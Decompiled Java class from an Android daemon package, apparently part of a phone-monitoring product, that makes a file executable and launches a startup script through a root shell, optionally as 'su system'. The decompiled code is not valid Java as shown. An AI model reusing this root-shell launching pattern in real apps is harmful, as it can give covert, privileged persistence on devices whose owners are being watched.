package com.fx.daemon;

import com.fx.daemon.exception.RunningException;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.KMShell;
import com.vvt.shell.f;
import com.vvt.shell.j;

public abstract class a
{
  private static final boolean a = com.vvt.h.a.a;
  private static final boolean b = com.vvt.h.a.e;
  
  private String a(String paramString, boolean paramBoolean)
  {
    int i = 1;
    String str1 = null;
    boolean bool1 = b;
    if (bool1) {}
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = paramString;
    String str2 = String.format("chmod 755 %s", arrayOfObject);
    KMShell.a(str2);
    bool1 = b;
    if (bool1) {}
    str2 = "";
    if (paramBoolean)
    {
      str2 = "%s; %s; %s";
      int j = 3;
      arrayOfObject = new Object[j];
      String str3 = "su system";
      arrayOfObject[0] = str3;
      arrayOfObject[i] = paramString;
      int k = 2;
      str1 = "exit";
      arrayOfObject[k] = str1;
      paramString = String.format(str2, arrayOfObject);
    }
    bool1 = a;
    if (bool1) {}
    str2 = KMShell.a(paramString);
    boolean bool2 = a;
    if (bool2) {}
    return str2;
  }
  
  public abstract String a();
  
  public void a(String[] paramArrayOfString)
  {
    int i = 0;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    String str1 = b();
    try
    {
      bool3 = a;
      if (bool3) {}
      localObject2 = f.b();
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      if (paramArrayOfString != null)
      {
        int j = paramArrayOfString.length;
        if (j > 0)
        {
          j = paramArrayOfString.length;
          while (i < j)
          {
            Object localObject4 = paramArrayOfString[i];
            Object localObject5 = " ";
            localObject5 = ((StringBuilder)localObject3).append((String)localObject5);
            Object localObject6 = new java/lang/StringBuilder;
            ((StringBuilder)localObject6).<init>();
            String str2 = "\"";
            localObject6 = ((StringBuilder)localObject6).append(str2);
            localObject4 = ((StringBuilder)localObject6).append((String)localObject4);
            localObject6 = "\"";
            localObject4 = ((StringBuilder)localObject4).append((String)localObject6);
            localObject4 = ((StringBuilder)localObject4).toString();
            ((StringBuilder)localObject5).append((String)localObject4);
            i += 1;
          }
        }
      }
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append(str1);
      str1 = ((StringBuilder)localObject3).toString();
      localObject1 = ((StringBuilder)localObject1).append(str1);
      localObject1 = ((StringBuilder)localObject1).toString();
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      str1 = ((f)localObject2).a((String)localObject1);
      boolean bool4 = a;
      if (bool4) {}
      ((f)localObject2).d();
      if (str1 != null)
      {
        localObject2 = str1.toLowerCase();
        localObject3 = "not found";
        bool3 = ((String)localObject2).contains((CharSequence)localObject3);
        if (bool3)
        {
          localObject1 = new com/fx/daemon/exception/RunningException;
          str1 = "Startup script not found";
          ((RunningException)localObject1).<init>(str1);
          throw ((Throwable)localObject1);
        }
      }
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      boolean bool3;
      Object localObject2;
      Object localObject3;
      RunningException localRunningException1 = new com/fx/daemon/exception/RunningException;
      localRunningException1.<init>("Cannot get root shell");
      throw localRunningException1;
      if (str1 != null)
      {
        localObject2 = str1.toLowerCase();
        localObject3 = "permission denied";
        bool3 = ((String)localObject2).contains((CharSequence)localObject3);
        if (bool3)
        {
          bool3 = false;
          localObject2 = null;
          a(localRunningException1, false);
        }
      }
      if (str1 != null)
      {
        str1 = str1.toLowerCase();
        localObject2 = "operation not permitted";
        bool2 = str1.contains((CharSequence)localObject2);
        if (bool2)
        {
          bool2 = false;
          str1 = null;
          a(localRunningException1, false);
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      return;
    }
    catch (Exception localException)
    {
      RunningException localRunningException2 = new com/fx/daemon/exception/RunningException;
      localRunningException2.<init>("Cannot get root shell");
      throw localRunningException2;
    }
  }
  
  public abstract String b();
  
  public void c()
  {
    a(null);
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    String str = a();
    j.b(str);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/fx/daemon/getInstance.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */